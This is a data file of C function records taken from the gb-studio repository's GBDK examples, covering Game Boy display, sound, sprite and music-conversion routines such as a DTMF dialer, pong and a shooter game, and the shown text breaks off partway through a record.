{"docstring": "/*\n\tCAUTION: Don't display the NULL code\n*/\n", "func_signal": "void disp(const char *str)", "code": "{\n\tUBYTE no, left_pos;\n\tUBYTE i, start_ch, end_ch;\n\tchar work[MAX_DTMF];\n\n\tclr_disp();\n\n\tno = 0;\n\twhile(str[no]){\n\t\tno++;\n\t}\n\n\tif(no >= LCD_WIDTH){\n\t\tstart_ch = no - LCD_WIDTH;\n\t\tend_ch = LCD_WIDTH;\n\t}\n\telse{\n\t\tstart_ch = 0;\n\t\tend_ch = no;\n\t}\n\tfor(i = 0;i < end_ch;i++){\n\t\twork[i] = str[i+start_ch];\n\t}\n\twork[end_ch] = 0x00;\n\n\tdisp_lcd(end_ch, work);\n\n\tleft_pos = 19 - end_ch;\n\tset_bkg_tiles(left_pos, 2, end_ch, LCD_HIGHT, disp_tile);\n}", "path": "gb-studio/buildTools/linux-x64/gbdk/examples/gb/gb-dtmf/gb-dtmf.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "// main funxction\n", "func_signal": "void main(void)", "code": "{\n    // init palettes\n    BGP_REG = OBP0_REG = OBP1_REG = 0xE4;\n\n    // load tile data into VRAM\n    set_sprite_data(0, 4, sprite_data);\n    \n    // init pad sprites\n    init_pad(0);\n    init_pad(1);\n    \n    // init ball sprite\n    set_sprite_tile(3, 2);\n\n    // show bkg and sprites\n    SHOW_BKG; SHOW_SPRITES;\n\n    // init 2 joypads\n    if (joypad_init(2, &joypads) != 2) {\n        printf(\" This program must\\n  be executed  on\\n   Super GameBoy\");\n        return;\n    }\n \n    // init players\n    player1 = 64, player2 = 64;\n    player1_score = player2_score = 0;\n    \n    // draw score\n    printf(HUD, player1_score, player2_score);\n    \n    // init ball\n    ballX = INITBALLX, ballY = INITBALLY;\n    spd_ballX = 1, spd_ballY = 1;\n    \n    while(1) {\n        // poll joypads\n        joypad_ex(&joypads);\n        \n        // player 1\n        if (joypads.joy0 & J_UP) {\n            player1 -= 2;\n            if (player1 < YMIN) player1 = YMIN;\n        } else if (joypads.joy0 & J_DOWN) {\n            player1 += 2;\n            if (player1 > YMAX) player1 = YMAX;            \n        }\n        draw_pad(0, PLAYER1_X, player1);\n        \n        // player 2\n        if (joypads.joy1 & J_UP) {\n            player2 -= 2;\n            if (player2 < YMIN) player2 = YMIN;\n        } else if (joypads.joy1 & J_DOWN) {\n            player2 += 2;\n            if (player2 > YMAX) player2 = YMAX;            \n        }\n        draw_pad(1, PLAYER2_X, player2);\n\n        // move ball\n        ballX += spd_ballX, ballY += spd_ballY;\n        // check bounce from limits\n        if ((ballY < YMIN) || (ballY > (YMAX + 24))) {\n            spd_ballY = -spd_ballY; \n        }\n        // check bounce from bats\n        if (ballX < (PLAYER1_X + 8)) {\n            if ((ballY > player1) && (ballY < (player1 + 24)) && (spd_ballX < 0)) \n                spd_ballX = -spd_ballX;\n        } else if (ballX > (PLAYER2_X - 8)) {\n            if ((ballY > player2) && (ballY < (player2 + 24)) && (spd_ballX > 0)) \n                spd_ballX = -spd_ballX;\n        }\n        // check player1 or 2 wins, update scores, start from center\n        if (ballX < PLAYER1_X) {\n            // player2 wins\n            ballX = INITBALLX, ballY = INITBALLY;\n            spd_ballX = -spd_ballX;\n            player2_score++;\n            gotoxy(0, 0); printf(HUD, player1_score, player2_score);\n        } else if (ballX > PLAYER2_X) {\n            // player1 wins\n            ballX = INITBALLX, ballY = INITBALLY;\n            spd_ballX = -spd_ballX;\n            player1_score++;\n            gotoxy(0, 0); printf(HUD, player1_score, player2_score);\n        }\n        // move ball sprite\n        move_sprite(3, ballX, ballY);\n\n        // wait for VBlank to slow down everything\n        wait_vbl_done();\n    }\n}", "path": "gb-studio/buildTools/darwin-x64/gbdk/examples/gb/sgb_pong/sgb_pong.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* Set sprite tiles */\n", "func_signal": "void tile_sprite()", "code": "{\n  UBYTE s;\n\n  s = sframe<<1;\n  set_sprite_tile(0, earth_tiles[s]);\n  set_sprite_tile(1, earth_tiles[s+1]);\n}", "path": "gb-studio/buildTools/win32-ia32/gbdk/examples/gb/galaxy/galaxy.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "// Returns 1 if ok\n", "func_signal": "int effect_mod_to_gb(u8 pattern_number, u8 step_number, u8 channel,\n                     u8 effectnum, u8 effectparams, u8 *converted_num,\n                     u8 *converted_params)", "code": "{\n    switch (effectnum)\n    {\n        case 0x0: // Arpeggio\n        {\n            if (effectparams != 0) // Arp has any data\n            {\n                *converted_num = 1;\n                *converted_params = effectparams;\n                return 1;\n            } else  {               // Mistook no effets for arp 000,\n                *converted_num = 7;  // use No Op NOP trigger effect instead.\n                *converted_params = effectparams;\n                return 1;\n            }\n        }\n        case 0x1:   // Ch1,2,3 Pitch Slide UP\n        {\n            *converted_num = 4;\n            *converted_params = (effectparams & 0x7F);\n            return 1;\n        }\n        case 0x2:   // Ch1,2,3 Pitch Slide DOWN\n        {\n            *converted_num = 4;\n            *converted_params = ( (effectparams & 0x7F) | 0x80 );\n            return 1;\n        }\n        case 0x9:   // Ch1,2,4 Volume + envelope, direct NRx2, was Offset\n        {\n            *converted_num = 15;\n            *converted_params = effectparams;\n            return 1;\n        }\n        case 0xA:   // Volume Slide (Volume envelope)\n        {\n            *converted_num = 7; // NOP\n            *converted_params = 1;\n            return 1;\n        }\n        case 0xB: // Jump\n        {\n            *converted_num = 8;\n            *converted_params = effectparams;\n            return 1;\n        }\n        case 0xC: // Volume -> Not handled here\n        {\n            printf(\"Strange error at pattern %d, step %d, channel %d: \"\n                   \"%01X%02X\\n\", pattern_number, step_number, channel,\n                   effectnum, effectparams);\n            return 0;\n        }\n        case 0xD: // Break + Set step\n        {\n            *converted_num = 9; // Effect value is BCD, convert to integer\n            *converted_params = (((effectparams & 0xF0) >> 4) * 10)\n                              +   (effectparams & 0x0F);\n            //*converted_params = effectparams; // ... or not?\n            return 1;\n        }\n        case 0xE:\n        {\n            if ((effectparams & 0xF0) == 0x80) // Pan\n            {\n                u8 left = 0;\n                u8 right = 0;\n\n                switch (effectparams & 0xF)\n                {\n                    case 0: case 1: case 2: case 3:\n                        left = 1;\n                        break;\n\n                    default:\n                    case 4: case 5: case 6: case 7:\n                    case 8: case 9: case 10: case 11:\n                        left = 1;\n                        right = 1;\n                        break;\n\n                    case 12: case 13: case 14: case 15:\n                        right = 1;\n                        break;\n                }\n                *converted_num = 0;\n                *converted_params = (left << (3 + channel))\n                                  | (right << (channel - 1)); // Channel 1-4\n                return 1;\n            }\n            if ((effectparams & 0xF0) == 0xC0) // Cut note\n            {\n                *converted_num = 2;\n                *converted_params = (effectparams & 0xF);\n                return 1;\n            }\n            else // Error\n            {\n                printf(\"Unsupported effect at pattern %d, step %d, channel %d: \"\n                       \"%01X%02X\\n\", pattern_number, step_number, channel,\n                       effectnum, effectparams);\n                return 0;\n            }\n            break;\n        }\n        case 0xF: // Speed\n        {\n            if (effectparams > 0x1F) // Nothing\n            {\n                printf(\"Unsupported BPM speed effect at pattern %d, step %d, \"\n                       \"channel %d: %01X%02X\\n\", pattern_number, step_number,\n                       channel, effectnum, effectparams);\n                return 0;\n            }\n            else // Speed\n            {\n                *converted_num = 10;\n                *converted_params = speed_mod_to_gb(effectparams);\n                return 1;\n            }\n            break;\n        }\n        default: // Nothing\n        {\n            printf(\"Unsupported effect at pattern %d, step %d, channel %d: \"\n                   \"%01X%02X\\n\", pattern_number, step_number, channel,\n                   effectnum, effectparams);\n            return 0;\n        }\n    }\n    return 0;\n}", "path": "gb-studio/buildTools/linux-x64/mod2gbt/mod2gbt.c", "commit_date": "2020-08-30 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* Display looks like 7-SEGMENT LED */\n", "func_signal": "void disp_lcd(UBYTE len, char str[MAX_DTMF])", "code": "{\n\tUBYTE i,j;\n\n\tj = len;\n\n\ti=0;\n\twhile(str[i]){\n\t\tif(str[i] >= '0'||'9' <= str[i]){\n\t\t\tdisp_tile[i] = OFFSET + (str[i] - '0') * 2;\n\t\t\tdisp_tile[i+j] = OFFSET + (str[i] - '0') * 2 + 1;\n\t\t}\n\t\tswitch(str[i]){\n\t\t\tcase 'A':\n\t\t\t\tdisp_tile[i] = OFFSET + 10 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 10 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'B':\n\t\t\t\tdisp_tile[i] = OFFSET + 11 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 11 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'C':\n\t\t\t\tdisp_tile[i] = OFFSET + 12 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 12 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'D':\n\t\t\t\tdisp_tile[i] = OFFSET + 13 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 13 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase '#':\n\t\t\t\tdisp_tile[i] = OFFSET + 14 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 14 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase '*':\n\t\t\t\tdisp_tile[i] = OFFSET + 15 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 15 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase ' ':\n\t\t\t\tdisp_tile[i] = OFFSET + 16 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 16 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'Y':\n\t\t\t\tdisp_tile[i] = OFFSET + 17 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 17 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'M':\n\t\t\t\tdisp_tile[i] = OFFSET + 18 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 18 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'U':\n\t\t\t\tdisp_tile[i] = OFFSET + 19 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 19 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'G':\n\t\t\t\tdisp_tile[i] = OFFSET + 20 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 20 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase '-':\n\t\t\t\tdisp_tile[i] = OFFSET + 21 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 21 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'T':\n\t\t\t\tdisp_tile[i] = OFFSET + 22 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 22 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase ',':\n\t\t\t\tdisp_tile[i] = OFFSET + 23 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 23 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'F':\n\t\t\t\tdisp_tile[i] = OFFSET + 24 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 24 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'S':\n\t\t\t\tdisp_tile[i] = OFFSET + ('5' - '0') * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + ('5' - '0') * 2 + 1;\n\t\t\tbreak;\n\t\t}\n\t\ti++;\n\t}\n}", "path": "gb-studio/buildTools/win32-ia32/gbdk/examples/gb/gb-dtmf/gb-dtmf.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "// inline function for moving pads; code of this function will be inlined with the code of main()\n", "func_signal": "inline void draw_pad(UINT8 n, UINT8 x, UINT8 y)", "code": "{\n    move_sprite(n << 2, x, y);\n    move_sprite((n << 2) + 1, x, y + 8);\n    move_sprite((n << 2) + 2, x, y + 16);\n}", "path": "gb-studio/buildTools/darwin-x64/gbdk/examples/gb/sgb_pong/sgb_pong.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/*\n\tInitialize for sound registers\n\tch1, ch2 are used for this routine.\n*/\n", "func_signal": "void init_dial()", "code": "{\n\n\tNR52_REG = 0x83U;\n\tNR51_REG = 0x00U;\n\tNR50_REG = 0x77U;\n\n\tNR24_REG = 0x87U;\n\tNR22_REG = 0xffU;\n\tNR21_REG = 0xbfU;\n\n\tNR14_REG = 0x87U;\n\tNR12_REG = 0xffU;\n\tNR11_REG = 0xbfU;\n\tNR10_REG = 0x04U;\n}", "path": "gb-studio/buildTools/win32-ia32/gbdk/examples/gb/gb-dtmf/gb-dtmf.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* Open and close the door */\n", "func_signal": "void door()", "code": "{\n  if(doorstate == OPENING) {\n    doorpos++;\n    /* Draw the door in the window */\n    set_win_tiles(2, 2, 12, 6, (unsigned char*)film[doorpos]);\n    if(doorpos == NBDFRAMES)\n      doorstate = OPENED;\n  } else if(doorstate == CLOSING) {\n    doorpos--;\n    /* Draw the door in the window */\n    set_win_tiles(2, 2, 12, 6, (unsigned char*)film[doorpos]);\n    if(doorpos == 0)\n      doorstate = CLOSED;\n  }\n}", "path": "gb-studio/buildTools/win32-ia32/gbdk/examples/gb/galaxy/galaxy.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/*\n\tCAUTION: Don't display the NULL code\n*/\n", "func_signal": "void disp(const char *str)", "code": "{\n\tUBYTE no, left_pos;\n\tUBYTE i, start_ch, end_ch;\n\tchar work[MAX_DTMF];\n\n\tclr_disp();\n\n\tno = 0;\n\twhile(str[no]){\n\t\tno++;\n\t}\n\n\tif(no >= LCD_WIDTH){\n\t\tstart_ch = no - LCD_WIDTH;\n\t\tend_ch = LCD_WIDTH;\n\t}\n\telse{\n\t\tstart_ch = 0;\n\t\tend_ch = no;\n\t}\n\tfor(i = 0;i < end_ch;i++){\n\t\twork[i] = str[i+start_ch];\n\t}\n\twork[end_ch] = 0x00;\n\n\tdisp_lcd(end_ch, work);\n\n\tleft_pos = 19 - end_ch;\n\tset_bkg_tiles(left_pos, 2, end_ch, LCD_HIGHT, disp_tile);\n}", "path": "gb-studio/buildTools/win32-ia32/gbdk/examples/gb/gb-dtmf/gb-dtmf.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* enemys */\n", "func_signal": "void enemys()", "code": "{\n  UBYTE i, j;\n\n  for( i=0; i<MAX_ET; i++ ) {\n    if( ef[i] == 1 ) {\n      /* move right to left */\n      ex[i]--;\n      if( (pl>0)&&(ey[i]<SPEED_EY) )  ex[i]--;\n      if( ex[i] <= MIN_EX ) {\n        ef[i] = 0;\n        set_sprite_tile( i*2+DEF_ES0, DEF_SP );\n        set_sprite_tile( i*2+DEF_ES1, DEF_SP );\n      } else {\n        /* new */\n        if( ex[i]<MIN_SX*8+13 ) {\n          set_sprite_tile( i*2+DEF_ES0, DEF_1EC0 );\n          set_sprite_tile( i*2+DEF_ES1, DEF_1EC1 );\n        } else if( ex[i]<MIN_SX*8+20 ) {\n          set_sprite_tile( i*2+DEF_ES0, DEF_1EC0 );\n          set_sprite_tile( i*2+DEF_ES1, DEF_1EC1+(ex[i]-MIN_SX*8-13) );\n        } else if( ex[i]<MIN_SX*8+28 ) {\n          set_sprite_tile( i*2+DEF_ES0, DEF_1EC0+(ex[i]-MIN_SX*8-20) );\n          set_sprite_tile( i*2+DEF_ES1, DEF_1EC1+8 );\n        } else if( ex[i]<MAX_SX*8+13 ) {\n          set_sprite_tile( i*2+DEF_ES0, DEF_1EC0+8 );\n          set_sprite_tile( i*2+DEF_ES1, DEF_1EC1+8 );\n        } else if( ex[i]<MAX_SX*8+20 ) {\n          set_sprite_tile( i*2+DEF_ES0, DEF_1EC0+8 );\n          set_sprite_tile( i*2+DEF_ES1, DEF_1EC1+(ex[i]-MAX_SX*8-12)+7 );\n        } else if( ex[i]<MAX_SX*8+28 ) {\n          set_sprite_tile( i*2+DEF_ES0, DEF_1EC0+(ex[i]-MAX_SX*8-20)+8 );\n          set_sprite_tile( i*2+DEF_ES1, DEF_1EC1 );\n        } else {\n          set_sprite_tile( i*2+DEF_ES0, DEF_1EC0 );\n          set_sprite_tile( i*2+DEF_ES1, DEF_1EC1 );\n        }\n        /* new */\n        move_sprite( i*2+DEF_ES0, ex[i]-SUB_EX0, ey[i] );\n        move_sprite( i*2+DEF_ES1, ex[i]-SUB_EX1, ey[i] );\n        /* check bomb */\n        for( j=0; j<MAX_TT; j++ ) {\n          if( tf[j] != 0 ) {\n            if( (ty[j]>ey[i]-2)&&(ty[j]<ey[i]+2) ) {\n              if( (tx[j]>(ex[i]-SUB_EX0-5))&&(tx[j]<(ex[i]-SUB_EX1+5)) ) {\n                /* hit */\n                tf[j] = 0; tx[j] = j*4+DEF_TX; ty[j] = DEF_TY;\n                set_sprite_tile( j+DEF_TS, tf[j]+DEF_TC );\n                set_sprite_attrb( j+DEF_TS, foreCGB[tf[j]+DEF_TC] );\n                move_sprite( j+DEF_TS, tx[j], ty[j] );\n                ef[i] = 3;\n                set_sprite_tile( i*2+DEF_ES0, ef[i]*2+DEF_BC1 );\n                set_sprite_attrb( i*2+DEF_ES0, foreCGB[ef[i]*2+DEF_BC1] );\n                set_sprite_tile( i*2+DEF_ES1, ef[i]*2+DEF_BC2 );\n                set_sprite_attrb( i*2+DEF_ES1, foreCGB[ef[i]*2+DEF_BC2] );\n              }\n            }\n          }\n        }\n        if( make_rnd(rnd_kirai) == 0 ) {\n          if( ((ex[i]-SUB_EX0)>MIN_PX)&&((ex[i]-SUB_EX0)<MAX_PX) ) {\n            if( kf[i] == 0 ) {\n              /* shot kirai */\n              kf[i] = 1;\n              kx[i] = ex[i]-SUB_EX0+4;\n              ky[i] = ey[i]-4;\n            } else if( kf[i+1] == 0 ) {\n              /* shot kirai */\n              kf[i+1] = 1;\n              kx[i+1] = ex[i]-SUB_EX0+4;\n              ky[i+1] = ey[i]-4;\n            } else if( kf[i+2] == 0 ) {\n              /* shot kirai */\n              kf[i+2] = 1;\n              kx[i+2] = ex[i]-SUB_EX0+4;\n              ky[i+2] = ey[i]-4;\n            }\n          }\n        }\n      }\n    } else if( ef[i] == 2 ) {\n      /* move left to right */\n      ex[i]++;\n      if( (pl>0)&&(ey[i]<SPEED_EY) )  ex[i]++;\n      if( ex[i] >= MAX_EX ) {\n        ef[i] = 0;\n        set_sprite_tile( i*2+DEF_ES0, DEF_SP );\n        set_sprite_tile( i*2+DEF_ES1, DEF_SP );\n      } else {\n        /* new */\n        if( i==9 ) {\n          if( ex[i]<MIN_SX*8+13 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_XEC0 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_XEC1 );\n          } else if( ex[i]<MIN_SX*8+20 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_XEC0 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_XEC1+(ex[i]-MIN_SX*8-13) );\n          } else if( ex[i]<MIN_SX*8+28 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_XEC0+(ex[i]-MIN_SX*8-20) );\n            set_sprite_tile( i*2+DEF_ES1, DEF_XEC1+8 );\n          } else if( ex[i]<MAX_SX*8+13 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_XEC0+8 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_XEC1+8 );\n          } else if( ex[i]<MAX_SX*8+20 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_XEC0+8 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_XEC1+(ex[i]-MAX_SX*8-12)+7 );\n          } else if( ex[i]<MAX_SX*8+28 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_XEC0+(ex[i]-MAX_SX*8-20)+8 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_XEC1 );\n          } else {\n            set_sprite_tile( i*2+DEF_ES0, DEF_XEC0 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_XEC1 );\n          }\n        } else {\n          if( ex[i]<MIN_SX*8+13 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_2EC0 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_2EC1 );\n          } else if( ex[i]<MIN_SX*8+20 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_2EC0 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_2EC1+(ex[i]-MIN_SX*8-13) );\n          } else if( ex[i]<MIN_SX*8+28 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_2EC0+(ex[i]-MIN_SX*8-20) );\n            set_sprite_tile( i*2+DEF_ES1, DEF_2EC1+8 );\n          } else if( ex[i]<MAX_SX*8+13 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_2EC0+8 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_2EC1+8 );\n          } else if( ex[i]<MAX_SX*8+20 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_2EC0+8 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_2EC1+(ex[i]-MAX_SX*8-12)+7 );\n          } else if( ex[i]<MAX_SX*8+28 ) {\n            set_sprite_tile( i*2+DEF_ES0, DEF_2EC0+(ex[i]-MAX_SX*8-20)+8 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_2EC1 );\n          } else {\n            set_sprite_tile( i*2+DEF_ES0, DEF_2EC0 );\n            set_sprite_tile( i*2+DEF_ES1, DEF_2EC1 );\n          }\n        }\n        /* new */\n        move_sprite( i*2+DEF_ES0, ex[i]-SUB_EX0, ey[i] );\n        move_sprite( i*2+DEF_ES1, ex[i]-SUB_EX1, ey[i] );\n        /* check bomb */\n        for( j=0; j<MAX_TT; j++ ) {\n          if( tf[j] != 0 ) {\n            if( (ty[j]>ey[i]-2)&&(ty[j]<ey[i]+2) ) {\n              if( (tx[j]>(ex[i]-SUB_EX0-5))&&(tx[j]<(ex[i]-SUB_EX1+5)) ) {\n                /* hit */\n                tf[j] = 0; tx[j] = j*4+DEF_TX; ty[j] = DEF_TY;\n                set_sprite_tile( j+DEF_TS, tf[j]+DEF_TC );\n                set_sprite_attrb( j+DEF_TS, foreCGB[tf[j]+DEF_TC] );\n                move_sprite( j+DEF_TS, tx[j], ty[j] );\n                ef[i] = 3;\n                set_sprite_tile( i*2+DEF_ES0, ef[i]*2+DEF_BC1 );\n                set_sprite_attrb( i*2+DEF_ES0, foreCGB[ef[i]*2+DEF_BC1] );\n                set_sprite_tile( i*2+DEF_ES1, ef[i]*2+DEF_BC2 );\n                set_sprite_attrb( i*2+DEF_ES1, foreCGB[ef[i]*2+DEF_BC2] );\n              }\n            }\n          }\n        }\n        if( make_rnd(rnd_kirai) == 0 ) {\n          if( ((ex[i]-SUB_EX0)>MIN_PX)&&((ex[i]-SUB_EX0)<MAX_PX) ) {\n            if( kf[i] == 0 ) {\n              /* shot kirai */\n              kf[i] = 1;\n              kx[i] = ex[i]-SUB_EX0+4;\n              ky[i] = ey[i]-4;\n            } else if( kf[i+1] == 0 ) {\n              /* shot kirai */\n              kf[i+1] = 1;\n              kx[i+1] = ex[i]-SUB_EX0+4;\n              ky[i+1] = ey[i]-4;\n            } else if( kf[i+2] == 0 ) {\n              /* shot kirai */\n              kf[i+2] = 1;\n              kx[i+2] = ex[i]-SUB_EX0+4;\n              ky[i+2] = ey[i]-4;\n            }\n          }\n        }\n      }\n    } else if( ef[i] >= 3 ) {\n      if( ef[i] > 4 ) {\n        ef[i] = 0;\n        set_sprite_tile( i*2+DEF_ES0, DEF_SP );\n        set_sprite_tile( i*2+DEF_ES1, DEF_SP );\n        if( i == 9 ) {\n          ps += 100; show_score( ps ); pp++;\n          set_level( pl-1 );\n        } else {\n          ps += (i+1); show_score( ps ); pp++;\n        }\n      } else {\n        set_sprite_tile( i*2+DEF_ES0, ef[i]*2+DEF_BC1 );\n        set_sprite_attrb( i*2+DEF_ES0, foreCGB[ef[i]*2+DEF_BC1] );\n        set_sprite_tile( i*2+DEF_ES1, ef[i]*2+DEF_BC2 );\n        set_sprite_attrb( i*2+DEF_ES1, foreCGB[ef[i]*2+DEF_BC2] );\n        ef[i]++;\n      }\n    } else if( i == 9 ) {\n      if( pp > 20 ) {\n        pp = 0;\n        pl++; show_level( pl );\n        /* X */\n        ey[i] = i*DEF_EH+DEF_EY;\n        ef[i] = i%2+1;\n        ex[i] = MIN_EX;\n        set_sprite_tile( i*2+DEF_ES0, DEF_XEC0 );\n        set_sprite_attrb( i*2+DEF_ES0, foreCGB[DEF_XEC0] );\n        set_sprite_tile( i*2+DEF_ES1, DEF_XEC1 );\n        set_sprite_attrb( i*2+DEF_ES1, foreCGB[DEF_XEC1] );\n        move_sprite( i*2+DEF_ES0, ex[i]-SUB_EX0, ey[i] );\n        move_sprite( i*2+DEF_ES1, ex[i]-SUB_EX1, ey[i] );\n      }\n    } else if( make_rnd(rnd_enemy) == 0 ) {\n      if( !((pl<4)&&(i==0)) ) {\n        /* create */\n        ey[i] = i*DEF_EH+DEF_EY;\n        ef[i] = i%2+1;\n        if( ef[i] == 1 ) {\n          ex[i] = MAX_EX;\n          set_sprite_tile( i*2+DEF_ES0, DEF_1EC0 );\n          set_sprite_attrb( i*2+DEF_ES0, foreCGB[DEF_1EC0] );\n          set_sprite_tile( i*2+DEF_ES1, DEF_1EC1 );\n          set_sprite_attrb( i*2+DEF_ES1, foreCGB[DEF_1EC1] );\n        } else {\n          ex[i] = MIN_EX;\n          set_sprite_tile( i*2+DEF_ES0, DEF_2EC0 );\n          set_sprite_attrb( i*2+DEF_ES0, foreCGB[DEF_2EC0] );\n          set_sprite_tile( i*2+DEF_ES1, DEF_2EC1 );\n          set_sprite_attrb( i*2+DEF_ES1, foreCGB[DEF_2EC1] );\n        }\n        move_sprite( i*2+DEF_ES0, ex[i]-SUB_EX0, ey[i] );\n        move_sprite( i*2+DEF_ES1, ex[i]-SUB_EX1, ey[i] );\n      }\n    }\n  }\n}", "path": "gb-studio/buildTools/linux-x64/gbdk/examples/gb/dscan/dscan.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* clear display */\n", "func_signal": "void clr_disp()", "code": "{\n\tset_bkg_data(OFFSET, 50, dtmf_lcd);\n\tset_bkg_tiles(LCD_X, LCD_Y, LCD_WIDTH, LCD_HIGHT, init_disp);\n}", "path": "gb-studio/buildTools/linux-x64/gbdk/examples/gb/gb-dtmf/gb-dtmf.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* Fade the screen (off and on) */\n", "func_signal": "void fade()", "code": "{\n  if(color == 0)\n    return;\n  switch(color)\n    {\n    case STARTFADE:\n    case STARTFADE-4*FADESTEP:\n      BGP_REG = 0xF9U;\n      break;\n    case STARTFADE-FADESTEP:\n    case STARTFADE-3*FADESTEP:\n      BGP_REG = 0xFEU;\n      break;\n    case STARTFADE-2*FADESTEP:\n      BGP_REG = 0xFFU;\n      break;\n    case STARTFADE-5*FADESTEP:\n      BGP_REG = 0xE4U;\n      break;\n    }\n  color--;\n}", "path": "gb-studio/buildTools/win32-ia32/gbdk/examples/gb/galaxy/galaxy.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "chrismaltby/gb-studio", "stars": 8006, "license": "mit", "language": "c", "size": 150556}
{"docstring": "/* Display looks like 7-SEGMENT LED */\n", "func_signal": "void disp_lcd(UBYTE len, char str[MAX_DTMF])", "code": "{\n\tUBYTE i,j;\n\n\tj = len;\n\n\ti=0;\n\twhile(str[i]){\n\t\tif(str[i] >= '0'||'9' <= str[i]){\n\t\t\tdisp_tile[i] = OFFSET + (str[i] - '0') * 2;\n\t\t\tdisp_tile[i+j] = OFFSET + (str[i] - '0') * 2 + 1;\n\t\t}\n\t\tswitch(str[i]){\n\t\t\tcase 'A':\n\t\t\t\tdisp_tile[i] = OFFSET + 10 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 10 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'B':\n\t\t\t\tdisp_tile[i] = OFFSET + 11 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 11 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'C':\n\t\t\t\tdisp_tile[i] = OFFSET + 12 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 12 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase 'D':\n\t\t\t\tdisp_tile[i] = OFFSET + 13 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 13 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase '#':\n\t\t\t\tdisp_tile[i] = OFFSET + 14 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 14 * 2 + 1;\n\t\t\tbreak;\n\t\t\tcase '*':\n\t\t\t\tdisp_tile[i] = OFFSET + 15 * 2;\n\t\t\t\tdisp_tile[i+j] = OFFSET + 15 * 2 